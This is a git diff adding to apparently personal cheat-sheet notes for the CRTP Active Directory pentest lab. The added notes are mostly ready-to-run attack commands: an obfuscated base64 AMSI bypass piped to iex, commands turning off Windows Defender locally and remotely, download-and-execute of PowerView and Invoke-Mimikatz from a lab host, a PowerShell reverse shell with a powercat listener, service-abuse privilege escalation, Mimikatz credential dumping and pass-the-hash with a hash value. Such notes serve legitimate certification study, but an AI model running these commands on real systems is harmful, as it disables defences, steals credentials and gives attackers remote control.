@@ -1,4 +1,35 @@
 # CRTP One Week Challenge
+#Main Notes
+### Load InviShell to avoid any enhanced login locally
+```
+C:/AD/Tools/InviShell/RunWithRegistryNonAdmin.bat
+```
+
+### Bypass AMSI
+```
+(neW-oBJeCt  iO.COMpRESsiOn.DeflAteSTrEAm([io.MemoryStREAM][coNveRT]::FrOmBAsE64StRINg( 'pZJRT9swEMff/SlOVqQmIqsyOjZENQnKpAkJWEUZe4jy4CaX1ZoTW7YzGqZ9dy5uBoWHvZAH53y+/8/3tx39kO3sED7DKWesc7L9CaveeWzmL2bTm671ssHpRevRarNC+1uW6OaMmW6tZAmlEs7BjvaHMaAv/6LURWO09TH/hbZFNTvkSRHWRpXzwtMPt0RtgeBLb+Er+qXV5VlVWXQuHrObK111ClPS2KExQyXXosFk/rbdLrWoLuXaCtvHI7p9C3attYI7aX0nFNnwWPp/FpQZPaXwfUxV9yv5QKY62Xqo1TXej5oUdOd3aWVq9U1V48LQ2F/GTxkj2Lvb3iBE4dgZi/a80JXmIV2cnOxb5KLhcADcyWmlFE9YNPa0L3h1A/vcFPhZ42RgrErRhmDR1TXaAWYIk7En0KtziJ7854MzKjlKIdt+yChhsS4iQ4il8OVm6GbRe8yLAuJsuzge6o4+DWOWhTHExyE+n5GM7u49qSb5/1/s9EpYtxGKmpsE0fD4J+fa9PFuZwKm8Nzox2TCJG7jHf8AgiRhjw==' ) , [SySteM.io.comPREssioN.CoMPReSSIONMOde]::DEcompreSS)| % { neW-oBJeCt io.sTreAMreaDER( $_ ,[TexT.eNcoDInG]::asCii)}).readtOeNd() |iEX
+```
+### Bypass Real-Time Monitoring
+```
+Powershell Set-MpPreference -DisableRealtimeMonitoring $true
+Powershell Set-MpPreference -DisableIOAVProtection $true
+PowerShell set-MpPreference -DisableAutoExclusions $true
+```
+
+### Load Script in memory to bypass Windows Defender
+```
+iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
+iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+
+### RevShell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
+```
+powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889
+powercat -l -v -p 889 -Timeout 100
+```
+
+
+
 
 # PowerShell
 
@@ -99,7 +130,7 @@ $client = New-Object System.$class.TCPClient($IPAddress,$PORT)
 > 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found
 
 ## 7. DC pwn
-> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**
+> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession -ComputerName dcorp-dc**
 
 ## 8. Domain Controller Persistence
 > 1. [ ] Golden Ticket
@@ -436,9 +467,13 @@ OR
 Invoke-UserHunter
 Invoke-UserHunter -GroupName "RDPUsers"
 ```
-To confirm admin access
+To confirm admin access in another local computer if yes you can run commands
 ```
-Invoke-UserHunter -CheckAccess
+Invoke-UserHunter -CheckAccess   #check if you have admin access on another computer
+Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}   #check who you are
+Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
+iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)   #load mimikatz on the memory
+Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}   #run mimikatz
 ```
 Find computers where a domain admin is logged in
 ```
@@ -487,6 +522,7 @@ gather information about a file --> get-content file.lnk
 user that you are logged in with --> whoami
 check user privilege --> whoami /priv
 check the group that you are belonging to --> whoami /groups
+check users in admin group --> net localgroup Administrator
 show all users on the machine --> net user
 gather info about X user --> net user <username>
 check all users in X group --> localgroup <groupname>
@@ -526,6 +562,17 @@ transferring a file in windows using pyftpdlib
 -     ftp 10.0.2.10
 Add a user
 -     net user raman to0or /add
+
+### After running powerup always check AbuseFuncion
+For example you got the following
+```
+AbuseFuncion : Invoke-ServiceAbuse -Name '<ServiceName>'
+```
+use help with example to check the example
+```
+help Invoke-ServiceAbuse -Examples
+Invoke-ServiceAbuse -Name "AbyssWebServer" -UserName "dcorp\student407"
+```
 
 you can use the below tools for complete coverage
 - PowerUp   https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
@@ -1595,4 +1642,19 @@ Start neo4j and BloodHound UI on kali machine and load the zip/json files
 ```
 sudo neo4j console&;bloodhound&
 ```
+
+# Mimikatz
+# Dump Creds from memory admin privilege is required
+```
+privilege::debug | token::elevate | sekurlsa::logonpasswords
+```
+# run powrshell using NTLM hash of a user
+```
+sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
+```
+
+
+
+
+
 
